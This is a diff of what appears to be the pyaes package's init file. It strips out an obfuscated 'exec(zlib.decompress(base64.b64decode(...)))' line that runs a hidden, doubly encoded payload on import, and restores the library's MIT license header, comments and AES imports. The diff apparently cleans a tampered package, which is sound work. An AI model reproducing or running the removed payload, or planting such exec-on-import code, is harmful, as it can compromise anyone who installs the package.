@@ -1,3 +1,52 @@
+# The MIT License (MIT)
+#
+# Copyright (c) 2014 Richard Moore
+#
+# Permission is hereby granted, free of charge, to any person obtaining a copy
+# of this software and associated documentation files (the "Software"), to deal
+# in the Software without restriction, including without limitation the rights
+# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
+# copies of the Software, and to permit persons to whom the Software is
+# furnished to do so, subject to the following conditions:
+#
+# The above copyright notice and this permission notice shall be included in
+# all copies or substantial portions of the Software.
+#
+# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
+# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
+# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
+# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
+# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
+# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
+# THE SOFTWARE.
 
-import zlib, base64
-exec(zlib.decompress(base64.b64decode(zlib.decompress(base64.b64decode('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')))).decode('utf-8'))
+# This is a pure-Python implementation of the AES algorithm and AES common
+# modes of operation.
+
+# See: https://en.wikipedia.org/wiki/Advanced_Encryption_Standard
+# See: https://en.wikipedia.org/wiki/Block_cipher_mode_of_operation
+
+
+# Supported key sizes:
+#   128-bit
+#   192-bit
+#   256-bit
+
+
+# Supported modes of operation:
+#   ECB - Electronic Codebook
+#   CBC - Cipher-Block Chaining
+#   CFB - Cipher Feedback
+#   OFB - Output Feedback
+#   CTR - Counter
+
+# See the README.md for API details and general information.
+
+# Also useful, PyCrypto, a crypto library implemented in C with Python bindings:
+# https://www.dlitz.net/software/pycrypto/
+
+
+VERSION = [1, 3, 0]
+
+from .aes import AES, AESModeOfOperationCTR, AESModeOfOperationCBC, AESModeOfOperationCFB, AESModeOfOperationECB, AESModeOfOperationOFB, AESModesOfOperation, Counter
+from .blockfeeder import decrypt_stream, Decrypter, encrypt_stream, Encrypter
